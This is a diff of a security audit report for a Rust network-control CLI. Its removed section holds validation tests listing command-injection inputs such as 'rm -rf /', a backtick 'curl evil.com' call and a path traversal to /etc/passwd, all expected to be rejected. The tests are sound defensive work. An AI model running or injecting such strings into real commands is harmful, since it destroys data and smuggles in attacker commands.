-3. **Dynamic Analysis:** Run under Valgrind/AddressSanitizer
-4. **Penetration Testing:** Conduct manual penetration testing
-5. **Code Review:** Have security expert review changes
-
-### Validation Tests
-```rust
-#[cfg(test)]
-mod security_tests {
-    use super::*;
-
-    #[test]
-    fn test_interface_name_injection() {
-        let bad_names = vec![
-            "wlan0; rm -rf /",
-            "eth0`curl evil.com`",
-            "wlan0\nmalicious",
-            "../../../etc/passwd",
-            "wlan0 && echo pwned",
-        ];
-
-        for name in bad_names {
-            assert!(validate_interface_name(name).is_err());
-        }
-    }
-
-    #[test]
-    fn test_ip_address_validation() {
-        assert!(validate_ip_address("192.168.1.1").is_ok());
-        assert!(validate_ip_address("256.1.1.1").is_err());
-        assert!(validate_ip_address("192.168.1.1; rm -rf /").is_err());
-    }
-}
-```
-
----
-
-## Dependencies Security
-
-Run regular dependency audits:
-```bash
-cargo audit
-cargo outdated
-```
-
-Current concerns:
-- Several dependencies have newer versions available
-- No critical CVEs identified in current dependencies
-- Recommend updating to latest stable versions
-
----
-
-## Compliance & Standards
-
-This application should comply with:
-- **CWE Top 25:** Address CWE-78 (Command Injection), CWE-22 (Path Traversal)
-- **OWASP Top 10:** A03:2021 (Injection), A01:2021 (Access Control)
-- **NIST 800-53:** AC-3 (Access Enforcement), SI-10 (Input Validation)
-
----
+1. **Fuzzing** - Use cargo-fuzz to test input parsers
+2. **Integration Tests** - Add security-focused integration tests
+3. **Penetration Testing** - Engage external security team before production deployment
 
 ## Conclusion
 
-The LnxNetCtl application has significant security vulnerabilities that must be addressed before production deployment. The most critical issues are command injection vulnerabilities affecting all core functionality. Implementing the recommended input validation and sanitization will substantially improve security posture.
-
-**Estimated Remediation Effort:** 3-4 weeks for full implementation and testing
-
-**Risk Level Before Fixes:** 🔴 **CRITICAL - DO NOT DEPLOY TO PRODUCTION**
-**Risk Level After Fixes:** 🟢 **ACCEPTABLE - with ongoing monitoring**
-
----
+The nccli tool has a solid foundation with good use of Rust's safety features. However, the identified vulnerabilities, particularly the path traversal issue, must be addressed before production use. The recommendations in this audit will significantly improve the security posture of the application.
 
 ## References
 
-- CWE-78: Improper Neutralization of Special Elements used in an OS Command
-  https://cwe.mitre.org/data/definitions/78.html
-- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
-  https://cwe.mitre.org/data/definitions/22.html
-- OWASP Command Injection
-  https://owasp.org/www-community/attacks/Command_Injection
-- Rust Security Guidelines
-  https://anssi-fr.github.io/rust-guide/
+- OWASP Top 10 2021: https://owasp.org/Top10/
+- CWE Top 25: https://cwe.mitre.org/top25/
+- Rust Security Guidelines: https://anssi-fr.github.io/rust-guide/
+- IEEE 802.11 Standards
 
 ---
 
-**Report prepared by:** Claude (AI Security Auditor)
-**Contact:** Report issues to repository maintainers
-**Next Review:** After implementation of critical fixes
+**Report Generated:** 2025-11-13
+**Next Audit Recommended:** After implementation of fixes
